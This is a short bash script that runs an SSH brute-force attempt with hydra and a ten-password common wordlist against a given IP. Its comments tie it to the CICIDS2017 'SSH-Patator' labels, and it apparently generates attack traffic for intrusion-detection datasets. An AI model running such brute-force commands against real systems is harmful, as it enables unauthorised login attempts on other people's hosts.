#!/bin/bash
# SSH brute force — simulates credential attack.
# Maps to CICIDS2017 "SSH-Patator" / Bruteforce labels.

set -e

TARGET="${1:-}"
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target-ip>"
    exit 1
fi

# A small wordlist — we don't want to actually succeed
WORDLIST="/tmp/ssh-passwords.txt"
cat > "$WORDLIST" << 'PASSWORDS'
admin
password
password123
root123
toor
letmein
qwerty
abc123
12345
welcome
PASSWORDS

echo "[*] SSH brute force against $TARGET (10 password attempts)"
echo "[!] These will all fail — that's the point"

hydra -l admin -P "$WORDLIST" -t 4 -f -V "ssh://$TARGET" 2>&1 | grep -E "login|password|attempt" || true

rm -f "$WORDLIST"
echo "[+] Brute force complete"
